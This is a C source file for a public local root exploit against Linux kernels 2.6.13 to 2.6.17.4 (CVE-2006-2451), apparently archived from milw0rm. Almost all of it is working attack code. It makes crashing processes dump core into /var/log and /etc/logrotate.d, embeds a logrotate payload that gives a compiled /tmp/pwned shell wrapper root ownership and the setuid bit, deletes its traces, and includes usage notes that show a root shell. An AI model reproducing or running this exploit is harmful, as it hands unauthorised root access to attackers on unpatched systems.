            /*
 * $Id: raptor_prctl2.c,v 1.3 2006/07/18 13:16:45 raptor Exp $
 *
 * raptor_prctl2.c - Linux 2.6.x suid_dumpable2 (logrotate)
 * Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * The suid_dumpable support in Linux kernel 2.6.13 up to versions before 
 * 2.6.17.4, and 2.6.16 before 2.6.16.24, allows a local user to cause a denial 
 * of service (disk consumption) and POSSIBLY (yeah, sure;) gain privileges via 
 * the PR_SET_DUMPABLE argument of the prctl function and a program that causes 
 * a core dump file to be created in a directory for which the user does not 
 * have permissions (CVE-2006-2451).
 *
 * This exploit uses the logrotate attack vector: of course, you must be able 
 * to chdir() into the /etc/logrotate.d directory in order to exploit the 
 * vulnerability. I've experimented a bit with other attack vectors as well, 
 * with no luck: at (/var/spool/atjobs/) uses file name information to 
 * establish execution time, /etc/cron.hourly|daily|weekly|monthly want +x 
 * permissions, xinetd (/etc/xinetd.d) puked out the crafted garbage-filled 
 * coredump (see also http://www.0xdeadbeef.info/exploits/raptor_prctl.c).
 * 
 * Thanks to Solar Designer for the interesting discussion on attack vectors.
 *
 * NOTE THAT IN ORDER TO WORK THIS EXPLOIT *MUST* BE STATICALLY LINKED!!!
 *
 * Usage:
 * $ gcc raptor_prctl2.c -o raptor_prctl2 -static -Wall
 * [exploit must be statically linked]
 * $ ./raptor_prctl2
 * [please wait until logrotate is run]
 * $ ls -l /tmp/pwned
 * -rwsr-xr-x  1 root users 7221 2006-07-18 13:32 /tmp/pwned
 * $ /tmp/pwned
 * sh-3.00# id
 * uid=0(root) gid=0(root) groups=16(dialout),33(video),100(users)
 * sh-3.00#
 * [don't forget to delete /tmp/pwned!]
 *
 * Vulnerable platforms:
 * Linux from 2.6.13 up to 2.6.17.4 [tested on SuSE Linux 2.6.13-15.8-default]
 */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/prctl.h>

#define INFO1	"raptor_prctl2.c - Linux 2.6.x suid_dumpable2 (logrotate)"
#define	INFO2	"Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>"

char payload[] = /* commands to be executed by privileged logrotate */
"\n/var/log/core {\n    daily\n    size=0\n    firstaction\n        chown root /tmp/pwned; chmod 4755 /tmp/pwned; rm -f /etc/logrotate.d/core; rm -f /var/log/core*\n    endscript\n}\n";

char pwnage[] = /* build setuid() helper to circumvent bash checks */
"echo \"main(){setuid(0);setgid(0);system(\\\"/bin/sh\\\");}\" > /tmp/pwned.c; gcc /tmp/pwned.c -o /tmp/pwned &>/dev/null; rm -f /tmp/pwned.c";

int main(void)
{
	int 		pid;
	struct rlimit 	corelimit;
	struct stat	st;

	/* print exploit information */
	fprintf(stderr, "%s\n%s\n\n", INFO1, INFO2);

	/* prepare the setuid() helper */
	system(pwnage);

	/* set core size to unlimited */
	corelimit.rlim_cur = RLIM_INFINITY;
	corelimit.rlim_max = RLIM_INFINITY;
	setrlimit(RLIMIT_CORE, &corelimit);

	/* let's create a fake logfile in /var/log */
	if (!(pid = fork())) {
		chdir("/var/log");
		prctl(PR_SET_DUMPABLE, 2);
		sleep(666);
		exit(1);
	}
	kill(pid, SIGSEGV);

	/* let's do the PR_SET_DUMPABLE magic */
	if (!(pid = fork())) {
		chdir("/etc/logrotate.d");
		prctl(PR_SET_DUMPABLE, 2);
		sleep(666);
		exit(1);
	}
	kill(pid, SIGSEGV);

	/* did it work? */
	sleep(3);
	if ((stat("/var/log/core", &st) < 0) || 
	    (stat("/etc/logrotate.d/core", &st) < 0)) {
		fprintf(stderr, "Error: Not vulnerable? See comments.\n");
		exit(1);
	}

	/* total pwnage */
	fprintf(stderr, "Please wait until logrotate is run and check /tmp/pwned;)\n");
	exit(0);
}

// milw0rm.com [2006-07-18]